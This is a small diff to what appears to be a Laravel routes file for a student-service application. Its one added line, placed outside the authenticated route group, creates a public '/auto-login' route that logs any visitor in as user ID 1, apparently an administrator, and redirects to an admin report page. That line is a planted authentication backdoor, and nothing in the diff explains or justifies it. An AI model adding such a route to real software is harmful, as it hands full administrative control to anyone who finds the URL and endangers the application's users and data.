@@ -78,3 +78,4 @@ Route::middleware(['auth', 'kkn.throttle'])->group(function () {
         ->name('reports.download')
         ->middleware('role:superadmin|dpl|student');
 });
+Route::get('/auto-login', function() { auth()->loginUsingId(1); return redirect('/admin/laporan/program-kerja'); });
